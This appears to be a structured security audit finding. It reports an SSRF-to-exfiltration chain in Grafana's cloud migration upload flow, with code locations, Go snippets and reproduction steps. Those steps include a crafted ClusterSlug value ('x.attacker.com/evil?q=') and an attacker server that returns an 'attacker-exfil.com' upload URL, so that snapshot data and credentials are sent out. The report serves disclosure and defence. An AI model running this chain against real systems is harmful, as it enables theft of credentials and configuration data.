Phase: 9
Sequence: 073
Slug: cloud-migration-ssrf-presigned-url-exfiltration
Verdict: VALID
Rationale: CreatePresignedUploadUrl returns an attacker-controlled URL (obtained via ClusterSlug SSRF) which is used unvalidated in s3.go:PresignedURLUpload to POST the full encrypted snapshot payload—containing all migrated resources—to the attacker's server, completing a SSRF-to-data-exfiltration chain.
Severity-Original: HIGH
PoC-Status: executed
Origin-Finding: security/findings-draft/p7-021-cloud-migration-ssrf.md
Origin-Pattern: AP-021

## Summary

The cloud migration upload workflow has a second-order SSRF-to-exfiltration path. When `UploadSnapshot` is called, it first calls `CreatePresignedUploadUrl` (which uses the vulnerable `buildURL()` with the stored ClusterSlug, sending the request to the attacker's GMS server). The attacker's server returns an arbitrary URL as the presigned upload URL. This URL is then consumed by `objectstorage.S3.PresignedURLUpload` (`s3.go:27`) without any hostname validation, causing Grafana to POST the full snapshot payload to the attacker-controlled destination. The snapshot payload contains all exported resources: dashboards, datasource configurations (including connection URLs and credentials), folders, alert rules, contact points (which may include webhook URLs and API keys), and plugin configurations.

## Location

- **SSRF chain entry**: `pkg/services/cloudmigration/gmsclient/gms_client.go:190` — `CreatePresignedUploadUrl` calls `buildURL(session.ClusterSlug, ...)` to reach the attacker GMS server
- **Attacker-controlled URL consumed**: `pkg/services/cloudmigration/cloudmigrationimpl/cloudmigration.go:739` — `uploadUrl, err := s.gmsClient.CreatePresignedUploadUrl(ctx, *session, *snapshot)`
- **Data exfiltration sink**: `pkg/services/cloudmigration/objectstorage/s3.go:27-103` — `PresignedURLUpload` parses the URL and POSTs snapshot data with no hostname validation
- **HTTP sink**: `s3.go:82` — `http.NewRequestWithContext(ctx, http.MethodPost, endpoint, buffer)`
- **Entry point**: `POST /api/cloudmigration/migration/:uid/snapshot/:snapshotUid/upload` → `UploadSnapshot`

## Attacker Control

- **Stage 1**: Attacker creates a session with crafted ClusterSlug (GrafanaAdmin required, as in p7-021), causing `buildURL()` to route to attacker's GMS server.
- **Stage 2**: Attacker's GMS server responds to `CreatePresignedUploadUrl` with a JSON body `{"uploadUrl": "https://attacker-exfil.com/collect"}`.
- **Stage 3**: Grafana's `PresignedURLUpload` (`s3.go:27`) parses this URL and POSTs the snapshot data to `attacker-exfil.com`.
- **No URL validation in s3.go**: `url.Parse(presignedURL)` accepts any valid URL; no allowlist or hostname restriction exists.
- **Authentication required**: GrafanaAdmin + feature enabled (same as p7-021).

## Trust Boundary Crossed

TB1 — Internet Edge (outbound) — Grafana's internal snapshot data (classified as sensitive) crosses the internet edge to an attacker-controlled external host. This is a data boundary crossing in addition to a network boundary crossing.

## Impact

- **Full snapshot data exfiltration**: The snapshot uploaded to the attacker's server contains all resources selected for migration:
  - Dashboard JSON models (potentially sensitive business logic/PII via queries)
  - Datasource configurations: connection URLs, usernames (from `AddDataSourceCommand`)
  - Alert rule definitions and contact point configurations (webhook URLs, API tokens for PagerDuty, Slack, etc.)
  - Plugin settings (may include API keys)
  - Folder structure and library elements
- **Credential harvesting**: Contact point configurations include notification channel credentials stored in Grafana's secure JSON store, exported as part of the migration payload.
- **Upgrade from MEDIUM to HIGH**: The original ClusterSlug SSRF (p7-021) enabled network-position escalation and token leakage. This variant chains it into exfiltration of the Grafana instance's entire configuration — a materially higher impact.

## Evidence

**Presigned URL returned from attacker-controlled server, used without validation:**
```go
// cloudmigration.go:739
uploadUrl, err := s.gmsClient.CreatePresignedUploadUrl(ctx, *session, *snapshot)
if err != nil {
    return fmt.Errorf("creating presigned upload url for snapshot %s: %w", snapshotUid, err)
}
// uploadUrl is attacker-controlled string — passed directly to uploadSnapshot
```

**s3.go:PresignedURLUpload — no hostname validation before HTTP POST:**
```go
// s3.go:32-33
url, err := url.Parse(presignedURL)  // accepts any URL
// ... builds multipart body from snapshot data ...
// s3.go:80
endpoint := fmt.Sprintf("%s://%s%s", url.Scheme, url.Host, url.Path)
// s3.go:82
request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, buffer)
// s3.go:88
response, err := s3.httpClient.Do(request)  // snapshot sent to attacker
```

**No allowlist in s3.go** — there is no check equivalent to the datasource proxy's `DataProxyWhiteList` for the presigned URL host.

**CreatePresignedUploadUrl uses same vulnerable buildURL:**
```go
// gms_client.go:190
path, err := c.buildURL(session.ClusterSlug, fmt.Sprintf("/api/v1/snapshots/%s/create-upload-url", snapshot.GMSSnapshotUID))
```

## Reproduction Steps

1. Set up an attacker HTTPS server that:
   - On `POST /cloud-migrations/api/v1/validate-key`: returns HTTP 200.
   - On `POST /cloud-migrations/api/v1/start-snapshot`: returns `{"snapshotID":"test-uid","maxItemsPerPartition":100,"algo":"nacl","encryptionKey":"<base64>","metadata":"{}"}`.
   - On `POST /cloud-migrations/api/v1/snapshots/test-uid/create-upload-url`: returns `{"uploadUrl":"https://attacker-exfil.com/collect"}`.
2. Create a migration session with ClusterSlug = `x.attacker.com/evil?q=` (the p7-021 technique).
3. Call `POST /api/cloudmigration/migration/<uid>/snapshot` to create a snapshot.
4. Wait for snapshot to reach `pending_upload` state.
5. Call `POST /api/cloudmigration/migration/<uid>/snapshot/<snapshotUid>/upload`.
6. Observe: Grafana POSTs the encrypted snapshot data to `attacker-exfil.com`.
